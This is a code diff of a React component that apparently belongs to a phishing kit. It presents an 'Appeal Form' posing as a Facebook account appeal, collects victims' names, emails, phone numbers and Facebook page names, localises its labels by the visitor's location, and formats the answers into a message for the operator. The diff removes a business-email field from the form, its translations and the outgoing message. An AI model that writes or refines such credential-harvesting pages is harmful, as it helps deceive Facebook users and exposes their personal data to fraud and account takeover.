@@ -13,7 +13,6 @@ interface FormData {
     information: string;
     fullName: string;
     personalEmail: string;
-    businessEmail: string;
     facebookPageName: string;
 }
 
@@ -27,7 +26,6 @@ const FORM_FIELDS: FormField[] = [
     { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
     { name: 'fullName', label: 'Full Name', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' },
-    { name: 'businessEmail', label: 'Business Email', type: 'email' },
     { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text' }
 ];
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
@@ -38,7 +36,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         information: '',
         fullName: '',
         personalEmail: '',
-        businessEmail: '',
         facebookPageName: ''
     });
 
@@ -51,7 +48,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -106,7 +103,6 @@ ${
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
-<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 <b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
 
